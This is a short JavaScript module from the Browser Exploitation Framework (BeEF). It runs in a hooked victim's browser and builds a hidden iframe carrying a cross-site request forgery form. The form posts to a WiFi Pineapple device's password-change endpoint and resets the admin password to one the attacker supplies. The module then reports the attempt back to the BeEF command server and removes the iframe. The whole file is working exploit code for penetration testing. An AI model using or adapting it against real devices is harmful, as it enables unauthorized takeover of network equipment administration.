//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var gateway = '<%= @base %>'; 
  var passwd  = '<%= @password %>';
  var timeout = 15;

  var wifi_pineapple_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "/components/system/configuration/functions.php?change_password", "POST", "application/x-www-form-urlencoded", [
    {'type':'hidden', 'name':'password',  'value':passwd} ,
    {'type':'hidden', 'name':'repeat',    'value':passwd},
    {'type':'hidden', 'name':'change_password', 'value':'Change Password'}
  ]);

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    document.body.removeChild(wifi_pineapple_iframe_<%= @command_id %>);
  }
  setTimeout("cleanup()", timeout*1000);

});

